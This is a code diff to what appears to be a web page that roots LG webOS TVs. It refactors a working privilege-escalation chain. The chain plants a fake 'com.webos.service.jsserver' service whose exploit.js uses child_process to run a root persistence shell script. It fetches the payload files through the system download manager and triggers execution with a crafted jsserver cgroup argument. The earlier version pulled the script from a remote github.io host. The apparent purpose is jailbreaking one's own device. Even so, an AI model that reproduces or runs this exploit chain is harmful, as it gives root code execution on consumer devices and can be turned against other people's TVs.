@@ -69,7 +69,7 @@
     var stateEl = document.getElementById('state');
     var detailEl = document.getElementById('detail');
     var scriptPath = '/media/internal/downloads/root_persistence.sh';
-    var downloadTarget = 'https://raws0kil.github.io/jsbro-autoroot/resources/root_persistence.sh';
+    var downloadTarget = new URL('../root_persistence.sh', window.location.href).toString();
     var debugMode = new URLSearchParams(window.location.search).has('debug');
 
     function setState(name, detail) {
@@ -98,25 +98,14 @@
     function runRootExploit() {
       setState('pending', 'preparing root execution...');
 
-      var exploitJs = `var cp = require("child_process"); var fs = require("fs");
-try {
-  cp.execSync("chmod +x ${scriptPath}");
-  cp.execSync("${debugMode ? 'UPLOAD_LOG=1 ' : ''}${scriptPath}");
-  fs.writeFileSync("/tmp/jsbro_root_done", "success");
-} catch(e) {
-  fs.writeFileSync("/tmp/jsbro_root_done", "error:" + e.message);
-}
-module.exports = { run: function(){} };`;
-
-      var pkgJson = '{"name":"com.webos.service.jsserver","main":"exploit.js"}';
-      var svcJson = '{"id":"com.webos.service.jsserver","services":[{"name":"com.webos.service.jsserver"}]}';
-
+      var payloadBase = new URL('./payload/', window.location.href).toString();
       var files = [
-        { name: 'package.json', content: pkgJson },
-        { name: 'services.json', content: svcJson },
-        { name: 'exploit.js', content: exploitJs }
+        { name: 'package.json', url: payloadBase + 'package.json' },
+        { name: 'services.json', url: payloadBase + 'services.json' },
+        { name: 'exploit.js', url: payloadBase + 'exploit.js' }
       ];
       var written = 0;
+      var targetDir = '/media/internal/downloads';
 
       function onAllWritten() {
         setState('pending', 'triggering root execution...');
@@ -128,7 +117,7 @@ module.exports = { run: function(){} };`;
           }
         };
         bridge.call('luna://com.webos.service.jsserver/run',
-          JSON.stringify({"inputParams": "-- /tmp/cgroup dummy /tmp"}));
+          JSON.stringify({"inputParams": "-- /tmp/cgroup dummy " + targetDir}));
 
         setState('pending', 'root exploit running. Watch your TV for the result...');
         var attempts = 0;
@@ -141,34 +130,39 @@ module.exports = { run: function(){} };`;
         }, 2000);
       }
 
-      files.forEach(function(file) {
+      function downloadFile(file) {
         var b = new window.PalmServiceBridge();
         b.onservicecallback = function(payload) {
           var parsed = parse(payload);
-          if (isObject(parsed) && parsed.completed === true) {
-            written++;
-            if (written === files.length) onAllWritten();
-          } else if (isObject(parsed) && parsed.ticket) {
+          if (!isObject(parsed)) return;
+          if (parsed.ticket) {
             var b2 = new window.PalmServiceBridge();
             b2.onservicecallback = function(p2) {
               var r = parse(p2);
-              if (isObject(r) && r.completed === true) {
+              if (!isObject(r)) return;
+              if (r.completed === true && !r.aborted && !r.interrupted) {
                 written++;
                 if (written === files.length) onAllWritten();
+              } else if (r.aborted || r.interrupted || r.state === 'failed') {
+                failStep('payload download', file.name + ': ' + (r.errorText || 'failed'));
               }
             };
             b2.call('luna://com.webos.service.downloadmanager/downloadStatusQuery',
               JSON.stringify({ ticket: parsed.ticket, subscribe: true }));
+          } else if (parsed.returnValue === false) {
+            failStep('payload download', file.name + ': ' + (parsed.errorText || 'request failed'));
           }
         };
         b.call('luna://com.webos.service.downloadmanager/download',
           JSON.stringify({
-            target: 'data:text/plain,' + encodeURIComponent(file.content),
-            targetDir: '/tmp',
+            target: file.url,
+            targetDir: targetDir,
             targetFilename: file.name,
-            subscribe: true
+            subscribe: false
           }));
-      });
+      }
+
+      files.forEach(downloadFile);
     }
 
     function watchDownload(ticket) {
